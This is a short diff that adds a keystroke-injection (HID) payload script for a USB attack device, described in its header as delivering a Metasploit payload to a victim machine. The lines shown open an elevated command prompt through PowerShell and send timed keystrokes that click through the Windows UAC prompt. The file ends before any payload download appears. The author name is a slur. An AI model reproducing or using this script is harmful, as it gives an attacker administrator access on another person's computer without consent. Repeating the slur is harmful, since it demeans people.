@@ -1,3 +1,21 @@
-#Created by the elite hack3rs
-#This is a change
-#hehe
+#!/bin/bash
+#
+# Title:    Our First Payload
+# Author:   BitchFagits
+# Version:  0.1
+#
+# This paylaod delivers a metasploit payload to run on the victim machine
+#
+# Colors.... later
+
+LED SETUP
+ATTACKMODE HID
+
+RUN WIN powershell -c "Start-Process cmd -verb runas"
+Q DELAY 250
+Q ENTER
+Q DELAY 1500
+Q LEFTARROW
+Q DELAY 500
+Q ENTER
+Q DELAY 1500
